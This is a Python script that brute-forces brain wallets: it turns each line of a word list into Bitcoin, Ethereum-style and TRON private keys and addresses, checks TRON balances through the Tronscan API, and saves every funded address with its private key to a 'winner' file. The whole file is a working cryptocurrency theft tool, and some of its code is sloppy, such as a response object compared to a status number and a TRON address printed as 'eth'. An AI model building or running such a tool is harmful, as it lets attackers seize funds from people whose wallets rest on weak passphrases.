import codecs
import hashlib
import base58
import ecdsa
import requests
from Crypto.Hash import keccak  # pip install pycryptodome
from colorama import Fore

from tron import TronBrainWallet
from ethereum import EthereumBrainWallet
from bitcoin import BitcoinBrainWallet


def keccak256(data):
    hasher = keccak.new(digest_bits=256)
    hasher.update(data)
    return hasher.digest()


def get_signing_key(raw_priv):
    return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)


def verifying_key_to_addr_tron(key):
    pub_key = key.to_string()
    primitive_addr = b'\x41' + keccak256(pub_key)[-20:]
    # 0 (zero), O (capital o), I (capital i) and l (lower case L)
    addr = base58.b58encode_check(primitive_addr)
    print(addr)
    return addr


# Start Color =============
Cyan = Fore.CYAN
Yellow = Fore.YELLOW
Red = Fore.RED
Green = Fore.GREEN
White = Fore.WHITE
Magenta = Fore.MAGENTA
# End Color ===============


mylist = []

with open('words.txt', newline='', encoding='utf-8') as f:
    for line in f:
        mylist.append(line.strip())


# class BrainWallet: (TRON)


def getxbal(addr):
    block = requests.get("https://apilist.tronscan.org/api/account?address=" + addr)
    if block != 204:
        res = block.json()
        balances = dict(res)["balances"][0]["amount"]
        return balances
    else:
        return 0.000000


count = 0
start = 3
win = 0
a = 1
for i in range(0, len(mylist)):
    count += 1
    passphrase = mylist[i]

    wallet_btc = BitcoinBrainWallet()
    private_key = wallet_btc.generate_address_from_passphrase(passphrase)
    print("private_key", private_key)

    pub_key = wallet_btc.generate_address(private_key)
    print("pub_key / P2PKH(u)", pub_key)  # 1PzYwVuTotg15ridCGNnAo8u3dr6bE2Yxy

    addresss = wallet_btc.generate_compressed_address(private_key)
    print("addresss / P2PKH(c)", addresss)  # 1NcK4WG5erCrauBjVCTJjLNwouQ8crPZAJ
    # P2SH(c) 3P8uceb6moBofWrpobLAnXwpe59A4hZnfn
    # BECH32(c) bc1qa5yyddflgkx89wz6he2zlegahshfz6y2552n9h

    addresss1 = wallet_btc.__private_to_public()
    print("addresss / P2PKH(c)", addresss1)
    print(wallet_btc.address_hex)
    # addresss2 = wallet_btc.__private_to_compressed_public(private_key)
    # addresss3 = wallet_btc.__public_to_address(public_key)
    # addresss4 = wallet_btc.base58(address_hex)

    wallet_eth = EthereumBrainWallet()
    private_key = wallet_eth.generate_address_from_passphrase(passphrase)
    raw = bytes.fromhex(private_key)
    key = get_signing_key(raw)
    addr = verifying_key_to_addr_tron(key.get_verifying_key()).decode()
    priv = raw.hex()
    bal = getxbal(addr)
    print("eth"
          '\nAddresss: ' + str(addr) +
          '\n DEC : ', int(priv, 16),
          '\n PASSPHRASE: ', str(passphrase),
          '\n Private Key : ', str(priv))

    wallet_tron = TronBrainWallet()
    private_key = wallet_tron.generate_address_from_passphrase(passphrase)
    raw = bytes.fromhex(private_key)
    key = get_signing_key(raw)
    addr = verifying_key_to_addr_tron(key.get_verifying_key()).decode()
    priv = raw.hex()
    bal = getxbal(addr)
    if float(bal) > 0:
        win += 1
        f = open("WinnerDetailsTRX.txt", "a")
        f.write('\nAddresss: ' + str(addr) + '         BALANCE: ' + str(bal))
        f.write('\nPRIVATEKEY: ' + str(priv))
        f.write('\n-------------------------- ---------- ---------------------------\n')
        print(Cyan, str(count), Green, str(addr), Cyan, '   BALANCE:', White, str(bal),
              White, '   PASSPHRASE: ', Cyan, str(passphrase))
    else:
        print(Cyan, str(count), Red, '  WIN:', White, str(win), Yellow, str(addr), Magenta, '   BALANCE:', White,
              str(bal),
              Yellow, '   PASSPHRASE: ', Cyan, str(passphrase))
        print(Yellow, 'Private Key : ', White, str(priv), '\n DEC : ', Red, int(priv, 16))
        print('|----------------------------------------[' + Red + ' ]----------------------------------------|')
